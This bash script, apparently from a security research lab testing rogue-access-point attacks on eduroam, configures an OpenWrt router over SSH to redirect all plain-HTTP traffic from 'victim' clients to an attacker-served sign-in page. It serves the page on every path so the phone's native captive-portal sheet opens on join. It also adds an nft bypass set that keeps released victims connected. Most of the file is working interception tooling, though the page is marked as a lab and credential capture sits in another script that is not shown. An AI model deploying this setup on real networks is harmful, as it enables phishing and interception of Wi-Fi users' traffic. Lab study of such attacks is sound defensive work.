#!/usr/bin/env bash
# Tier 2 - plain-HTTP interception on the attacker path (lab only).
#
# Redirects every port-80 request from edu clients (the attacker eduroam victims)
# to an attacker-controlled page served by a second uhttpd instance on B. HTTPS
# (443) is deliberately NOT touched - transparent HTTPS needs a MITM CA the victim
# trusts (Tier 3 / mitmproxy), which is exactly what GECKO prevents.
#
# Because the OS captive-portal probe (captive.apple.com / connectivitycheck /
# ncsi.txt) is itself a plain :80 GET, intercepting :80 makes the phone's native
# captive sheet pop up on join - no need for the victim to open a browser. The
# attacker splash is served on *every* path (uhttpd error_page -> index), so the
# probe's own URL returns it and the sheet shows the page instead of a 404.
#
# Keep-connected: a per-client bypass set (edu_released) is inserted at the TOP of
# dstnat_edu. Once a victim finishes the portal (portal.sh adds their IP via the
# login CGI), their :80 re-probes skip the redirect and reach the real internet,
# so iOS marks the network "online" and stops dropping it / disabling auto-join.
# This only helps if the victim actually HAS upstream, i.e. edu-path.sh is on.
#
#   on   add the fw4 DNAT (edu tcp:80 -> 10.98.0.1:8880) + uhttpd attacker page
#        + the edu_released bypass set/rule (empty until portal.sh releases a client)
#   off  remove the DNAT (uhttpd instance is left in place, harmless)
#   status
#
# The redirect lives in fw4's per-zone chain dstnat_edu, so it only affects edu
# traffic - the lan/GeckoTest/openNDS path is never touched. A full fw4 reload
# clears the live set/rule (both are re-applied by this script, not by UCI), so
# re-run `on` after any `/etc/init.d/firewall reload`.
#
#   lab/eduroam/attacker/http-intercept.sh on|off|status
set -euo pipefail

MB=${MANGO_B:-mango-b}
SSH=(ssh -o BatchMode=yes "$MB")
usage() { echo "usage: $0 on|off|status" >&2; exit 2; }
[ $# -eq 1 ] || usage

PAGE='<!doctype html><html><head><meta charset="utf-8"><title>eduroam-lab</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font:16px -apple-system,system-ui,sans-serif;margin:0;background:#0b1f3a;color:#fff}
.c{max-width:520px;margin:12vh auto;padding:28px}h1{font-size:22px}</style></head><body><div class="c">
<h1>Network sign-in required</h1>
<p>Your session on <b>eduroam-lab</b> needs re-authentication.</p>
<p style="opacity:.6;font-size:13px">[LAB] This plain-HTTP request was intercepted and served by the attacker access point. HTTPS sites are not shown here.</p>
</div></body></html>'

case "$1" in
on)
	"${SSH[@]}" "
		mkdir -p /www-attacker
		cat > /www-attacker/index.html <<'HTML'
$PAGE
HTML
		uci set uhttpd.attacker=uhttpd
		uci set uhttpd.attacker.listen_http='10.98.0.1:8880'
		uci set uhttpd.attacker.home='/www-attacker'
		uci set uhttpd.attacker.index_page='index.html'
		uci set uhttpd.attacker.max_requests='50'
		# Serve the splash on every path (incl. the probe URL /hotspot-detect.html,
		# /generate_204, /ncsi.txt ...) so the OS captive sheet shows it, not a 404.
		uci set uhttpd.attacker.error_page='/index.html'
		uci commit uhttpd
		/etc/init.d/uhttpd restart >/dev/null 2>&1
		uci set firewall.atk_http=redirect
		uci set firewall.atk_http.name='attacker-http-intercept'
		uci set firewall.atk_http.src='edu'
		uci set firewall.atk_http.proto='tcp'
		uci set firewall.atk_http.src_dport='80'
		uci set firewall.atk_http.dest_ip='10.98.0.1'
		uci set firewall.atk_http.dest_port='8880'
		uci set firewall.atk_http.target='DNAT'
		uci commit firewall
		/etc/init.d/firewall reload >/dev/null 2>&1
		# --- per-client release (keep victims connected after they submit the portal) ---
		# edu_released holds the IPs of victims who finished the portal; the return
		# rule at the TOP of dstnat_edu makes their :80 re-probes skip the redirect
		# and reach the real internet, so the OS keeps the network 'online'. Added
		# live via nft AFTER the fw4 reload above (a later reload clears it -> re-run).
		nft add set inet fw4 edu_released '{ type ipv4_addr; flags timeout; timeout 2h; }' 2>/dev/null || true
		nft list chain inet fw4 dstnat_edu 2>/dev/null | grep -q attacker-release \
			|| nft insert rule inet fw4 dstnat_edu ip saddr @edu_released counter return comment \"attacker-release\"
	"
	echo "http-intercept ON: edu port-80 traffic -> attacker page (10.98.0.1:8880). HTTPS untouched."
	echo "  (OS captive sheet pops on join; portal.sh releases a victim so they stay online.)"
	;;
off)
	"${SSH[@]}" '
		uci -q delete firewall.atk_http || true
		uci commit firewall
		/etc/init.d/firewall reload >/dev/null 2>&1
	'
	echo "http-intercept OFF: DNAT removed, edu HTTP flows normally again."
	;;
status)
	"${SSH[@]}" '
		echo "fw4 redirect:"; nft list table inet fw4 2>/dev/null | grep "attacker-http-intercept" || echo "  (none)"
		echo "release rule:"; nft list chain inet fw4 dstnat_edu 2>/dev/null | grep "attacker-release" || echo "  (none)"
		echo "released IPs:"; nft list set inet fw4 edu_released 2>/dev/null | grep -oE "elements = \{[^}]*\}" || echo "  (none)"
		echo "attacker page:"; (wget -qO- http://10.98.0.1:8880/ 2>/dev/null || uclient-fetch -qO- http://10.98.0.1:8880/ 2>/dev/null) | grep -o "<title>.*</title>" || echo "  (uhttpd attacker not serving)"
	'
	;;
*) usage ;;
esac
